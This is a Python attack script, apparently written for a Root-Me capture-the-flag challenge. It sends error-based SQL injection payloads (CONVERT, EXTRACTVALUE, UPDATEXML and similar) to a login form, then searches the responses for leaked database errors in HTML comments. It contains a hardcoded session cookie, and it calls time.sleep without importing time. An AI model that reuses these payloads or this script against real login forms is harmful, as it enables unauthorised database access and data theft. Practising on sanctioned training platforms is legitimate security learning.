import requests

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

def test_login_with_headers(username, password):
    """Prueba login y muestra todas las cabeceras"""
    data = {"username": username, "password": password}
    try:
        r = requests.post(f"{URL}?action=login", data=data, cookies=COOKIE, timeout=10)
        print(f"\n{'='*70}")
        print(f"Payload: {username}")
        print(f"{'='*70}")
        print(f"Status Code: {r.status_code}")
        print(f"Headers:")
        for key, value in r.headers.items():
            print(f"  {key}: {value}")
        print(f"\nContenido (primeros 200 caracteres):")
        print(r.text[:200])
        print(f"Longitud: {len(r.text)}")
        
        # Buscar errores en el HTML (comentarios ocultos)
        if "<!--" in r.text:
            import re
            comments = re.findall(r'<!--(.*?)-->', r.text, re.DOTALL)
            for comment in comments:
                if any(word in comment.lower() for word in ['error', 'sql', 'mysql', 'warning']):
                    print(f"\n[!] Comentario sospechoso: {comment[:200]}")
        
        return r
    except Exception as e:
        print(f"Error: {e}")
        return None

print("="*70)
print("  INSPECCIONANDO CABECERAS Y CÓDIGO DE ESTADO")
print("="*70)

# Baseline
test_login_with_headers("admin", "test")

# Probar payloads que deberían generar errores
error_payloads = [
    "admin' AND 1=CONVERT(int, @@version)-- -",
    "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version))-- -",
    "admin' AND UPDATEXML(1, CONCAT(0x7e, @@version), 1)-- -",
    "admin' AND 1/0-- -",
    "admin' AND 1=2",
    "admin' AND '1'='2",
]

for payload in error_payloads:
    test_login_with_headers(payload, "test")
    time.sleep(0.5)
